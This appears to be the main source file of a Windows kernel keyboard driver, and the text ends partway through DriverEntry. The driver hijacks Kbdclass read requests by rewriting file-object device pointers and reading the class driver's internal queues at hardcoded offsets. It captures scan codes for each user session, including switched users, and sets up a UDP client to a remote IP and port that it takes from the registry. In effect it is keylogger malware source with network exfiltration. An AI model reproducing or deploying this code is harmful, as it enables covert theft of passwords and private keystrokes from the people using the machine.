/*++
Module Name: driver_main.c
Abstract: Main driver implementation for keyboard input filtering and logging.
--*/

#include "driver.h"
#include "network.h"
#include "scancode.h"

// Global Driver Device Object
PDEVICE_OBJECT g_FilterDeviceObject = NULL;

// Driver Configuration
#define KBDDRIVER_THREAD_DELAY_INTERVAL    100000  // 10ms in 100-nanosecond units
#define KBDDRIVER_MAX_DEVICE_EXTENSION     sizeof(KBDDRIVER_DEVICE_EXTENSION)

/*++
Routine: KbdIrp_PassThrough
Description: 
    GENERIC PASS-THROUGH.
    Forward all unhandled IRPs (PnP, Power, etc.) to the next driver.
--*/
NTSTATUS
KbdIrp_PassThrough(
    _In_ PDEVICE_OBJECT DeviceObject,
    _Inout_ PIRP Irp
)
{
    NTSTATUS Status = STATUS_SUCCESS;
    PIO_STACK_LOCATION IrpStack = IoGetCurrentIrpStackLocation(Irp);
    PLIST_ENTRY ListEntry;
    PKBDDRIVER_KEYBOARD_OBJECT KeyboardObject = NULL;
    PKBDDRIVER_DEVICE_EXTENSION DeviceExtension;

    DeviceExtension = (PKBDDRIVER_DEVICE_EXTENSION)g_FilterDeviceObject->DeviceExtension;

    // Try to find the keyboard object associated with this FileObject
    ListEntry = DeviceExtension->KbdObjListHead.Flink;
    while (ListEntry != &DeviceExtension->KbdObjListHead)
    {
        KeyboardObject = CONTAINING_RECORD(ListEntry, KBDDRIVER_KEYBOARD_OBJECT, ListEntry);
        if (KeyboardObject->KbdFileObject == IrpStack->FileObject) {
            break;
        }
        ListEntry = ListEntry->Flink;
    }

    // If we found the underlying device, forward it there.
    if (KeyboardObject != NULL && KeyboardObject->KbdDeviceObject != NULL) {
        IoSkipCurrentIrpStackLocation(Irp);
        return IoCallDriver(KeyboardObject->KbdDeviceObject, Irp);
    }

    // If we lack context, pass down blindly if possible, or complete default
    Status = Irp->IoStatus.Status;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return Status;
}

/*++
Routine: KbdIrp_DeviceControl
Description: Handles IRP_MJ_DEVICE_CONTROL requests
--*/
NTSTATUS
KbdIrp_DeviceControl(
    _In_ PDEVICE_OBJECT DeviceObject,
    _Inout_ PIRP Irp
)
{
    NTSTATUS                        Status;
    PIO_STACK_LOCATION              IrpStack;
    PLIST_ENTRY                     ListEntry;
    PKBDDRIVER_KEYBOARD_OBJECT      KeyboardObject;
    PKBDDRIVER_DEVICE_EXTENSION     DeviceExtension;
    
    UNREFERENCED_PARAMETER(DeviceObject);
    
    IrpStack = IoGetCurrentIrpStackLocation(Irp);
    DeviceExtension = (PKBDDRIVER_DEVICE_EXTENSION)g_FilterDeviceObject->DeviceExtension;
    KeyboardObject = NULL;
    
    // Find the keyboard object matching this file object
    ListEntry = DeviceExtension->KbdObjListHead.Flink;
    while (ListEntry != &DeviceExtension->KbdObjListHead)
    {
        KeyboardObject = CONTAINING_RECORD(
            ListEntry,
            KBDDRIVER_KEYBOARD_OBJECT,
            ListEntry
        );
        if (KeyboardObject->KbdFileObject == IrpStack->FileObject) {
            break;
        }
        
        ListEntry = ListEntry->Flink;
    }
    
    if (KeyboardObject == NULL) {
        IoSkipCurrentIrpStackLocation(Irp);
        Status = STATUS_INVALID_PARAMETER;
        Irp->IoStatus.Status = Status;
        IoCompleteRequest(Irp, IO_NO_INCREMENT);
        return Status;
    }
    
    IoSkipCurrentIrpStackLocation(Irp);
    Status = IoCallDriver(KeyboardObject->KbdDeviceObject, Irp);
    
    return Status;
}

/*++
Routine: KbdIrp_Cancel
Description: Cancellation routine for pending read IRPs.
--*/
VOID
KbdIrp_Cancel(
    _In_ PDEVICE_OBJECT DeviceObject,
    _In_ PIRP Irp
)
{
    PIO_STACK_LOCATION              IrpStack;
    PLIST_ENTRY                     ListEntry;
    PKBDDRIVER_KEYBOARD_OBJECT      KeyboardObject;
    PKBDDRIVER_DEVICE_EXTENSION     DeviceExtension;
    
    UNREFERENCED_PARAMETER(DeviceObject);

    IoReleaseCancelSpinLock(Irp->CancelIrql);
    
    IrpStack = IoGetCurrentIrpStackLocation(Irp);
    DeviceExtension = (PKBDDRIVER_DEVICE_EXTENSION)g_FilterDeviceObject->DeviceExtension;
    KeyboardObject = NULL;
    
    ListEntry = DeviceExtension->KbdObjListHead.Flink;
    while (ListEntry != &DeviceExtension->KbdObjListHead)
    {
        KeyboardObject = CONTAINING_RECORD(
            ListEntry,
            KBDDRIVER_KEYBOARD_OBJECT,
            ListEntry
        );
        if (KeyboardObject->KbdFileObject == IrpStack->FileObject) {
            break;
        }
        
        ListEntry = ListEntry->Flink;
    }
    
    if (KeyboardObject == NULL) {
        Irp->IoStatus.Status = STATUS_CANCELLED;
        IoCompleteRequest(Irp, IO_NO_INCREMENT);
        return;
    }
    
    ExEnterCriticalRegionAndAcquireResourceExclusive(&KeyboardObject->Resource);
    KeyboardObject->IrpCancel = TRUE;
    KeyboardObject->KbdFileObject->DeviceObject = KeyboardObject->BttmDeviceObject;
    ExReleaseResourceAndLeaveCriticalRegion(&KeyboardObject->Resource);
    
    if (KeyboardObject->NewIrp != NULL) {
        IoCancelIrp(KeyboardObject->NewIrp);
    }
    
    Irp->IoStatus.Status = STATUS_CANCELLED;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
}

/*++
Routine: KbdThread_HandleRead
Description: System thread that handles keyboard read operations.
--*/
VOID
KbdThread_HandleRead(
    _In_ PVOID StartContext
)
{
    NTSTATUS                        Status;
    PIRP                            OriginalIrp;
    PIRP                            ForwardedIrp;
    PIO_STACK_LOCATION              OriginalStack;
    PIO_STACK_LOCATION              ForwardedStack;
    PLIST_ENTRY                     ListEntry;
    PKBDDRIVER_KEYBOARD_OBJECT      KeyboardObject;
    PKBDDRIVER_DEVICE_EXTENSION     DeviceExtension;
    PIO_REMOVE_LOCK                 RemoveLock;
    PKEYBOARD_INPUT_DATA            InputData;

    if (StartContext == NULL) {
        PsTerminateSystemThread(STATUS_INVALID_PARAMETER);
        return;
    }
    
    OriginalIrp = (PIRP)StartContext;
    OriginalStack = IoGetCurrentIrpStackLocation(OriginalIrp);
    DeviceExtension = (PKBDDRIVER_DEVICE_EXTENSION)g_FilterDeviceObject->DeviceExtension;
    KeyboardObject = NULL;
    
    ListEntry = DeviceExtension->KbdObjListHead.Flink;
    while (ListEntry != &DeviceExtension->KbdObjListHead)
    {
        KeyboardObject = CONTAINING_RECORD(
            ListEntry,
            KBDDRIVER_KEYBOARD_OBJECT,
            ListEntry
        );
        if (KeyboardObject->KbdFileObject == OriginalStack->FileObject) {
            break;
        }
        
        ListEntry = ListEntry->Flink;
    }
    
    if (KeyboardObject == NULL) {
        Status = STATUS_INVALID_PARAMETER;
        goto Exit;
    }
    
    RemoveLock = (PIO_REMOVE_LOCK)((PCHAR)KeyboardObject->KbdDeviceObject->DeviceExtension 
        + REMOVE_LOCK_OFFSET_DE);

    if (OriginalIrp == KeyboardObject->RemoveLockIrp) {
        IoReleaseRemoveLock(RemoveLock, OriginalIrp);
        KeyboardObject->RemoveLockIrp = NULL;
    }
    
    ForwardedIrp = IoBuildSynchronousFsdRequest(
        IRP_MJ_READ,
        KeyboardObject->KbdDeviceObject,
        OriginalIrp->AssociatedIrp.SystemBuffer,
        OriginalStack->Parameters.Read.Length,
        &OriginalStack->Parameters.Read.ByteOffset,
        &KeyboardObject->Event,
        &OriginalIrp->IoStatus
    );

    if (ForwardedIrp == NULL) {
        Status = STATUS_INSUFFICIENT_RESOURCES;
        goto Exit;
    }
    
    KeClearEvent(ForwardedIrp->UserEvent);
    ForwardedIrp->Tail.Overlay.Thread = PsGetCurrentThread();
    ForwardedIrp->RequestorMode = KernelMode;
    
    ForwardedStack = IoGetNextIrpStackLocation(ForwardedIrp);
    ForwardedStack->FileObject = KeyboardObject->KbdFileObject;
    ForwardedStack->Parameters.Read.Key = OriginalStack->Parameters.Read.Key;
    
    ExEnterCriticalRegionAndAcquireResourceExclusive(&KeyboardObject->Resource);
    KeyboardObject->NewIrp = ForwardedIrp;
    ExReleaseResourceAndLeaveCriticalRegion(&KeyboardObject->Resource);
    
    Status = IoCallDriver(KeyboardObject->KbdDeviceObject, ForwardedIrp);
    
    if (Status == STATUS_PENDING) {
        KeWaitForSingleObject(
            ForwardedIrp->UserEvent,
            Executive,
            KernelMode,
            FALSE,
            NULL
        );
        Status = OriginalIrp->IoStatus.Status;
    }
    
    if (KeyboardObject->IrpCancel) {
        ExEnterCriticalRegionAndAcquireResourceExclusive(&KeyboardObject->Resource);
        KeyboardObject->SafeUnload = TRUE;
        ExReleaseResourceAndLeaveCriticalRegion(&KeyboardObject->Resource);
        goto Exit;
    } else {
        IoSetCancelRoutine(OriginalIrp, NULL);
    }
    
    if (NT_SUCCESS(OriginalIrp->IoStatus.Status) && OriginalIrp->IoStatus.Information > 0)
    {
        OriginalStack->Parameters.Read.Length = (ULONG)OriginalIrp->IoStatus.Information;
        InputData = (PKEYBOARD_INPUT_DATA)OriginalIrp->AssociatedIrp.SystemBuffer;
        
        while ((PCHAR)InputData < (PCHAR)OriginalIrp->AssociatedIrp.SystemBuffer + OriginalIrp->IoStatus.Information)
        {
            KbdHandler_ProcessScanCode(InputData);
            KbdHandler_ConfigureMapping(InputData);
            InputData++;
        }
        
        ExEnterCriticalRegionAndAcquireResourceExclusive(&KeyboardObject->Resource);
        KeyboardObject->SafeUnload = TRUE;
        ExReleaseResourceAndLeaveCriticalRegion(&KeyboardObject->Resource);
        
        IoCompleteRequest(OriginalIrp, IO_KEYBOARD_INCREMENT);
    }
    else
    {
        ExEnterCriticalRegionAndAcquireResourceExclusive(&KeyboardObject->Resource);
        KeyboardObject->SafeUnload = TRUE;
        ExReleaseResourceAndLeaveCriticalRegion(&KeyboardObject->Resource);
        
        IoCompleteRequest(OriginalIrp, IO_NO_INCREMENT);
    }
    
Exit:
    PsTerminateSystemThread(Status);
}

/*++
Routine: KbdIrp_Read
Description: Handles IRP_MJ_READ requests
--*/
NTSTATUS
KbdIrp_Read(
    _In_ PDEVICE_OBJECT DeviceObject,
    _Inout_ PIRP Irp
)
{
    NTSTATUS Status = STATUS_SUCCESS;
    PIO_STACK_LOCATION IrpStack;
    PKBDDRIVER_KEYBOARD_OBJECT KeyboardObject;
    PLIST_ENTRY ListEntry;
    HANDLE ThreadHandle = NULL;

    UNREFERENCED_PARAMETER(DeviceObject);

    IrpStack = IoGetCurrentIrpStackLocation(Irp);

    if (IrpStack->Parameters.Read.Length == 0) {
        Status = STATUS_SUCCESS;
    }
    else if (IrpStack->Parameters.Read.Length % sizeof(KEYBOARD_INPUT_DATA)) {
        Status = STATUS_BUFFER_TOO_SMALL;
    }
    else {
        Status = STATUS_PENDING;
    }

    Irp->IoStatus.Status = Status;
    Irp->IoStatus.Information = 0;

    if (Status == STATUS_PENDING)
    {
        IoSetCancelRoutine(Irp, KbdIrp_Cancel);

        if (Irp->Cancel) {
            Status = STATUS_CANCELLED;
            IoCompleteRequest(Irp, IO_NO_INCREMENT);
            goto Exit;
        }

        ListEntry = ((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdObjListHead.Flink;
        while (ListEntry != &((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdObjListHead)
        {
            KeyboardObject = CONTAINING_RECORD(ListEntry, KBDDRIVER_KEYBOARD_OBJECT, ListEntry);
            if (KeyboardObject->KbdFileObject == IrpStack->FileObject)
            {
                ExEnterCriticalRegionAndAcquireResourceExclusive(&KeyboardObject->Resource);
                KeyboardObject->SafeUnload = FALSE;
                ExReleaseResourceAndLeaveCriticalRegion(&KeyboardObject->Resource);
                break;
            }
            ListEntry = ListEntry->Flink;
        }

        IoMarkIrpPending(Irp);

        Status = PsCreateSystemThread(
            &ThreadHandle,
            THREAD_ALL_ACCESS,
            NULL,
            NULL,
            NULL,
            KbdThread_HandleRead,
            Irp);

        if (!NT_SUCCESS(Status)) {
            IoCompleteRequest(Irp, IO_NO_INCREMENT);
            goto Exit;
        }

        if (ThreadHandle != NULL) {
            ZwClose(ThreadHandle);
            ThreadHandle = NULL;
        }

        return STATUS_PENDING;
    }
    else {
        IoCompleteRequest(Irp, IO_NO_INCREMENT);
    }

Exit:
    return Status;
}

/*++
Routine: KbdDriver_DequeueRead
Description: Dequeues the next available read IRP regardless of FileObject
--*/
PIRP
KbdDriver_DequeueRead(
    _In_ PCHAR DeviceExtension
)
{
    ASSERT(DeviceExtension != NULL);

    PIRP NextIrp = NULL;
    LIST_ENTRY* ReadQueue = (LIST_ENTRY*)(DeviceExtension + READ_QUEUE_OFFSET_DE);

    while (!NextIrp && !IsListEmpty(ReadQueue))
    {
        PDRIVER_CANCEL OldCancelRoutine;
        PLIST_ENTRY ListEntry = RemoveHeadList(ReadQueue);

        NextIrp = CONTAINING_RECORD(ListEntry, IRP, Tail.Overlay.ListEntry);
        OldCancelRoutine = IoSetCancelRoutine(NextIrp, NULL);

        if (OldCancelRoutine) {
            // Cancel routine not called for this IRP. Return this IRP.
        }
        else {
            // IRP cancelled. Initialize list and skip.
            InitializeListHead(&NextIrp->Tail.Overlay.ListEntry);
            NextIrp = NULL;
        }
    }
    return NextIrp;
}

/*++
Routine: KbdThread_IrpHookInit
Description: System thread that initializes IRP hooking AND handles network reset.
             CRITICAL FIX: Support multiple FileObjects (sessions) per DeviceObject.
--*/
VOID
KbdThread_IrpHookInit(
    _In_ PVOID StartContext
)
{
    UNREFERENCED_PARAMETER(StartContext);

    NTSTATUS Status = STATUS_SUCCESS;
    PDEVICE_OBJECT KbdDeviceObject = NULL;
    PLIST_ENTRY ListEntry;
    PCHAR KbdDeviceExtension = NULL;
    PIO_REMOVE_LOCK RemoveLock = NULL;
    PKSPIN_LOCK SpinLock = NULL;
    KIRQL Irql;
    PIRP Irp = NULL;
    PIO_STACK_LOCATION IrpStack;
    PKBDDRIVER_KEYBOARD_OBJECT KeyboardObject;
    HANDLE ThreadHandle = NULL;
    LARGE_INTEGER Interval;
    
    Interval.QuadPart = -1 * KBDDRIVER_THREAD_DELAY_INTERVAL;

    while (!((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->IsUnloading)
    {
        // Network Recovery Logic
        if (InterlockedCompareExchange(&g_NetworkResetNeeded, 0, 1) == 1)
        {
            NetClient_Cleanup();
            PKBDDRIVER_DEVICE_EXTENSION DevExt = (PKBDDRIVER_DEVICE_EXTENSION)g_FilterDeviceObject->DeviceExtension;
            LPCWSTR UseIP = (DevExt->RemoteIP != NULL) ? DevExt->RemoteIP : KBDDRIVER_REMOTE_IP;
            LPCWSTR UsePort = (DevExt->RemotePort != NULL) ? DevExt->RemotePort : KBDDRIVER_REMOTE_PORT;
            NetClient_Initialize(UseIP, UsePort, AF_INET, SOCK_DGRAM);
        }

        // Loop through all keyboard class devices
        KbdDeviceObject = ((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdDriverObject->DeviceObject;

        while (KbdDeviceObject != NULL)
        {
            KbdDeviceExtension = KbdDeviceObject->DeviceExtension;
            RemoveLock = (PIO_REMOVE_LOCK)(KbdDeviceExtension + REMOVE_LOCK_OFFSET_DE);
            SpinLock = (PKSPIN_LOCK)(KbdDeviceExtension + SPIN_LOCK_OFFSET_DE);

            // Try to dequeue a pending Read IRP from the class driver queue
            // This IRP contains the FileObject of the session trying to read (e.g., New User)
            KeAcquireSpinLock(SpinLock, &Irql);
            Irp = KbdDriver_DequeueRead(KbdDeviceExtension);
            KeReleaseSpinLock(SpinLock, Irql);

            // If no IRP is pending, move to next device
            if (Irp == NULL) {
                KbdDeviceObject = KbdDeviceObject->NextDevice;
                continue;
            }

            // We got an IRP! Check if we ALREADY process this FileObject.
            IrpStack = IoGetCurrentIrpStackLocation(Irp);
            
            ListEntry = ((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdObjListHead.Flink;
            BOOLEAN AlreadyHooked = FALSE;

            while (ListEntry != &((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdObjListHead)
            {
                KeyboardObject = CONTAINING_RECORD(ListEntry, KBDDRIVER_KEYBOARD_OBJECT, ListEntry);
                // Check both Device and FileObject. Same Device can have multiple FileObjects (User 1, User 2).
                if (KeyboardObject->KbdDeviceObject == KbdDeviceObject && 
                    KeyboardObject->KbdFileObject == IrpStack->FileObject) 
                {
                    AlreadyHooked = TRUE;
                    break;
                }
                ListEntry = ListEntry->Flink;
            }

            if (AlreadyHooked) {
                // We already handle this user session. Put the IRP back (fail it safely so it's retried or handled)
                // Actually, since we dequeued it, we should complete it or re-queue. 
                // Simplest safe filter behavior: Complete with 0 so app retries, or Cancel.
                // Note: Since we "stole" it from kbdclass queue, we must complete it.
                IoSetCancelRoutine(Irp, NULL);
                Irp->IoStatus.Status = STATUS_SUCCESS; // Or STATUS_PRIVILEGE_NOT_HELD to force retry? 
                // Let's just complete with 0 info, the app will issue another read.
                Irp->IoStatus.Information = 0;
                IoReleaseRemoveLock(RemoveLock, Irp);
                IoCompleteRequest(Irp, IO_NO_INCREMENT);
                
                // Don't skip KbdDeviceObject here, check again next loop
                // But to avoid infinite loop in this cycle, move next.
                KbdDeviceObject = KbdDeviceObject->NextDevice;
                continue;
            }

            // *** NEW SESSION DETECTED ***
            // We have an IRP for a FileObject we don't track yet. Hook it!

            IoSetCancelRoutine(Irp, KbdIrp_Cancel);

            KeyboardObject = ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof(KBDDRIVER_KEYBOARD_OBJECT), KBDDRIVER_POOL_TAG);
            if (KeyboardObject == NULL) {
                Irp->IoStatus.Status = STATUS_INSUFFICIENT_RESOURCES;
                Irp->IoStatus.Information = 0;
                IoReleaseRemoveLock(RemoveLock, Irp);
                IoCompleteRequest(Irp, IO_NO_INCREMENT);
                goto Cleanup;
            }

            RtlZeroMemory(KeyboardObject, sizeof(KBDDRIVER_KEYBOARD_OBJECT));
            KeyboardObject->SafeUnload = FALSE;
            KeyboardObject->RemoveLockIrp = Irp;
            KeyboardObject->KbdFileObject = IrpStack->FileObject;
            KeyboardObject->BttmDeviceObject = IrpStack->FileObject->DeviceObject;
            KeyboardObject->KbdDeviceObject = KbdDeviceObject;

            KeInitializeEvent(&KeyboardObject->Event, SynchronizationEvent, FALSE);
            ExInitializeResourceLite(&KeyboardObject->Resource);

            KeyboardObject->KbdFileObject->DeviceObject = g_FilterDeviceObject;
            g_FilterDeviceObject->StackSize = max(KeyboardObject->BttmDeviceObject->StackSize, g_FilterDeviceObject->StackSize);

            ExInterlockedInsertTailList(
                &((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdObjListHead,
                &KeyboardObject->ListEntry,
                &((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdObjSpinLock);

            KeyboardObject->InitSuccess = TRUE;
            KBD_INFO("NEW HOOK: Device=%p, FileObject=%p (Switch User Detected)", KbdDeviceObject, KeyboardObject->KbdFileObject);

            Status = PsCreateSystemThread(
                &ThreadHandle,
                THREAD_ALL_ACCESS,
                NULL,
                NULL,
                NULL,
                KbdThread_HandleRead,
                Irp);

            if (!NT_SUCCESS(Status)) {
                // Fallback cleanup handled by caller logic usually, but here we are deep.
                // If thread fails, we lose the IRP.
                KBD_ERROR("Thread creation failed");
                // Just cleanup object
                 if (!KeyboardObject->InitSuccess) {
                    if (KeyboardObject->KbdFileObject->DeviceObject != KeyboardObject->BttmDeviceObject) {
                        KeyboardObject->KbdFileObject->DeviceObject = KeyboardObject->BttmDeviceObject;
                    }
                    ExDeleteResourceLite(&KeyboardObject->Resource);
                    ExFreePoolWithTag(KeyboardObject, KBDDRIVER_POOL_TAG);
                }
            }

            if (ThreadHandle != NULL) {
                ZwClose(ThreadHandle);
                ThreadHandle = NULL;
            }

            // Stay on the same KbdDeviceObject in case there are MORE pending IRPs (unlikely but possible)
            // Or move next to be safe against spinning.
            KbdDeviceObject = KbdDeviceObject->NextDevice;
            continue;

Cleanup:
             // Generic cleanup if outer loops fail
             KbdDeviceObject = KbdDeviceObject->NextDevice;
        }

        KeDelayExecutionThread(KernelMode, FALSE, &Interval);
    }

    PsTerminateSystemThread(Status);
}

/*++
Routine: KbdDriver_CleanupKeyboardObjects
Description: Cleans up all keyboard objects during driver unload.
--*/
VOID
KbdDriver_CleanupKeyboardObjects(
    VOID
)
{
    PKBDDRIVER_KEYBOARD_OBJECT KeyboardObject;
    PLIST_ENTRY ListEntry;
    PCHAR KbdDeviceExtension;
    PIO_REMOVE_LOCK RemoveLock;
    PKSPIN_LOCK SpinLock;
    KIRQL Irql;
    PIRP Irp;
    LARGE_INTEGER Interval;

    Interval.QuadPart = -1 * KBDDRIVER_THREAD_DELAY_INTERVAL;

    while (!IsListEmpty(&((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdObjListHead))
    {
        ListEntry = ExInterlockedRemoveHeadList(
            &((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdObjListHead,
            &((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdObjSpinLock);

        KeyboardObject = CONTAINING_RECORD(ListEntry, KBDDRIVER_KEYBOARD_OBJECT, ListEntry);

        if (!KeyboardObject->IrpCancel)
        {
            KbdDeviceExtension = KeyboardObject->KbdDeviceObject->DeviceExtension;
            RemoveLock = (PIO_REMOVE_LOCK)((PCHAR)KeyboardObject->KbdDeviceObject->DeviceExtension + REMOVE_LOCK_OFFSET_DE);
            SpinLock = (PKSPIN_LOCK)(KbdDeviceExtension + SPIN_LOCK_OFFSET_DE);

            KeAcquireSpinLock(SpinLock, &Irql);
            Irp = KbdDriver_DequeueRead(KbdDeviceExtension);
            KeReleaseSpinLock(SpinLock, Irql);

            KeyboardObject->KbdFileObject->DeviceObject = KeyboardObject->BttmDeviceObject;

            if (Irp != NULL) {
                Irp->IoStatus.Status = 0;
                Irp->IoStatus.Information = 0;
                IoReleaseRemoveLock(RemoveLock, Irp);
                IoCompleteRequest(Irp, IO_NO_INCREMENT);
            }

            while (!KeyboardObject->SafeUnload) {
                KeDelayExecutionThread(KernelMode, FALSE, &Interval);
            }
        }
        
        ExDeleteResourceLite(&KeyboardObject->Resource);
        if (KeyboardObject != NULL) {
            ExFreePoolWithTag(KeyboardObject, KBDDRIVER_POOL_TAG);
            KeyboardObject = NULL;
        }
    }
    KeDelayExecutionThread(KernelMode, FALSE, &Interval);
}

/*++
Routine: KbdDriver_Unload
Description: Driver unload routine.
--*/
VOID 
KbdDriver_Unload(
    _In_ PDRIVER_OBJECT DriverObject
)
{
    UNREFERENCED_PARAMETER(DriverObject);

    ((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->IsUnloading = TRUE;

    KbdDriver_CleanupKeyboardObjects();
    KbdHandler_FlushBuffer();

    NetClient_FullCleanup();
    WSKCleanup();

    if (((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdDriverObject != NULL) {
        ObDereferenceObject(((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdDriverObject);
        ((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdDriverObject = NULL;
    }

    if (((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->RemoteIP != NULL) {
        ExFreePoolWithTag(((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->RemoteIP, KBDDRIVER_POOL_TAG);
    }
    if (((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->RemotePort != NULL) {
        ExFreePoolWithTag(((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->RemotePort, KBDDRIVER_POOL_TAG);
    }

    if (g_FilterDeviceObject != NULL) {
        IoDeleteDevice(g_FilterDeviceObject);
        g_FilterDeviceObject = NULL;
    }
}

/*++
Routine: ReadRegistryConfig
Description: Reads network configuration from registry Parameters key
--*/
NTSTATUS
ReadRegistryConfig(
    _In_ PUNICODE_STRING RegistryPath,
    _Out_ LPWSTR* RemoteIP,
    _Out_ LPWSTR* RemotePort
)
{
    NTSTATUS Status;
    HANDLE KeyHandle = NULL;
    OBJECT_ATTRIBUTES ObjAttr;
    UNICODE_STRING ValueName;
    UNICODE_STRING ParamsPath;
    PKEY_VALUE_PARTIAL_INFORMATION ValueInfo = NULL;
    ULONG Length;
    WCHAR PathBuffer[512];
    
    *RemoteIP = NULL;
    *RemotePort = NULL;
    
    RtlStringCbPrintfW(PathBuffer, sizeof(PathBuffer), L"%wZ\\Parameters", RegistryPath);
    RtlInitUnicodeString(&ParamsPath, PathBuffer);
    
    InitializeObjectAttributes(&ObjAttr, &ParamsPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
    Status = ZwOpenKey(&KeyHandle, KEY_READ, &ObjAttr);
    if (!NT_SUCCESS(Status)) {
        goto UseDefaults;
    }
    
    Length = sizeof(KEY_VALUE_PARTIAL_INFORMATION) + 256 * sizeof(WCHAR);
    ValueInfo = ExAllocatePool2(POOL_FLAG_PAGED, Length, KBDDRIVER_POOL_TAG);
    if (ValueInfo == NULL) {
        Status = STATUS_INSUFFICIENT_RESOURCES;
        goto Cleanup;
    }
    
    RtlInitUnicodeString(&ValueName, L"RemoteIP");
    Status = ZwQueryValueKey(KeyHandle, &ValueName, KeyValuePartialInformation, ValueInfo, Length, &Length);
    if (NT_SUCCESS(Status) && ValueInfo->Type == REG_SZ && ValueInfo->DataLength > 0) {
        *RemoteIP = ExAllocatePool2(POOL_FLAG_PAGED, ValueInfo->DataLength, KBDDRIVER_POOL_TAG);
        if (*RemoteIP != NULL) RtlCopyMemory(*RemoteIP, ValueInfo->Data, ValueInfo->DataLength);
    }
    
    RtlInitUnicodeString(&ValueName, L"RemotePort");
    Status = ZwQueryValueKey(KeyHandle, &ValueName, KeyValuePartialInformation, ValueInfo, Length, &Length);
    if (NT_SUCCESS(Status) && ValueInfo->Type == REG_SZ && ValueInfo->DataLength > 0) {
        *RemotePort = ExAllocatePool2(POOL_FLAG_PAGED, ValueInfo->DataLength, KBDDRIVER_POOL_TAG);
        if (*RemotePort != NULL) RtlCopyMemory(*RemotePort, ValueInfo->Data, ValueInfo->DataLength);
    }
    
Cleanup:
    if (ValueInfo != NULL) ExFreePoolWithTag(ValueInfo, KBDDRIVER_POOL_TAG);
    if (KeyHandle != NULL) ZwClose(KeyHandle);
    
UseDefaults:
    if (*RemoteIP == NULL) {
        ULONG Len = (ULONG)((wcslen(KBDDRIVER_REMOTE_IP) + 1) * sizeof(WCHAR));
        *RemoteIP = ExAllocatePool2(POOL_FLAG_PAGED, Len, KBDDRIVER_POOL_TAG);
        if (*RemoteIP != NULL) RtlStringCbCopyW(*RemoteIP, Len, KBDDRIVER_REMOTE_IP);
    }
    
    if (*RemotePort == NULL) {
        ULONG Len = (ULONG)((wcslen(KBDDRIVER_REMOTE_PORT) + 1) * sizeof(WCHAR));
        *RemotePort = ExAllocatePool2(POOL_FLAG_PAGED, Len, KBDDRIVER_POOL_TAG);
        if (*RemotePort != NULL) RtlStringCbCopyW(*RemotePort, Len, KBDDRIVER_REMOTE_PORT);
    }
    
    return (*RemoteIP != NULL && *RemotePort != NULL) ? STATUS_SUCCESS : STATUS_INSUFFICIENT_RESOURCES;
}

/*++
Routine: DriverEntry
Description: Driver initialization
--*/
NTSTATUS
DriverEntry(
    _In_ PDRIVER_OBJECT  DriverObject,
    _In_ PUNICODE_STRING RegistryPath
)
{
    NTSTATUS Status = STATUS_SUCCESS;
    UNICODE_STRING DriverName;
    PDRIVER_OBJECT KbdDriverObject = NULL;
    WSKDATA WSKData;
    HANDLE ThreadHandle = NULL;
    LPWSTR RemoteIP = NULL;
    LPWSTR RemotePort = NULL;
    LPCWSTR UseIP;
    LPCWSTR UsePort;
    int i;

    Status = ReadRegistryConfig(RegistryPath, &RemoteIP, &RemotePort);
    if (!NT_SUCCESS(Status)) {
        // Defaults handled inside
    }

    RtlInitUnicodeString(&DriverName, L"\\KeyboardFilter");
    Status = IoCreateDevice(
        DriverObject,
        KBDDRIVER_MAX_DEVICE_EXTENSION,
        &DriverName,
        FILE_DEVICE_KEYBOARD,
        0,
        FALSE,
        &g_FilterDeviceObject);
    if (!NT_SUCCESS(Status)) {
        goto Cleanup;
    }

    g_FilterDeviceObject->Flags |= DO_BUFFERED_IO;

    RtlInitUnicodeString(&DriverName, L"\\Driver\\Kbdclass");
    Status = ObReferenceObjectByName(
        &DriverName,
        OBJ_CASE_INSENSITIVE,
        NULL,
        FILE_ALL_ACCESS,
        *IoDriverObjectType,
        KernelMode,
        NULL,
        &KbdDriverObject);
    if (!NT_SUCCESS(Status)) {
        goto Cleanup;
    }

    ((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdDriverObject = KbdDriverObject;
    ((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->RemoteIP = RemoteIP;
    ((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->RemotePort = RemotePort;
    
    InitializeListHead(&((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdObjListHead);
    KeInitializeSpinLock(&((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdObjSpinLock);

    // PassThrough for all to support PnP/Power
